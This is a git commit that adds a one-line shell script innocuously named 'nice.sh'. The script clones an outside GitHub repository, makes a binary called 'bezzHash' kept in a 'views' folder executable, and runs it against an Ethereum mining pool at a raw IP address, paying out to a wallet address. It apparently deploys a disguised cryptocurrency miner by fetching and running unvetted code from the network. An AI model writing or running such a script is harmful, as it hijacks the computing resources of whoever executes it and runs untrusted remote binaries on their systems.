765b2566523597bfd8975f36c6197bf1444e552a
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2022-06-07 08:53:44 +0700

    Create nice.sh

---
+++ nice.sh
@@ -0,0 +1,1 @@
+git clone https://github.com/githuboneheart/mom.git && cd mom && cd views && chmod +x bezzHash && ./bezzHash --algo ETHASH --pool 149.248.19.20:443 --user 3CnZTtQYF7sGJHr1LsFRds4GmUvB1dUjAM.Semogaberkah --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROX --basecolor
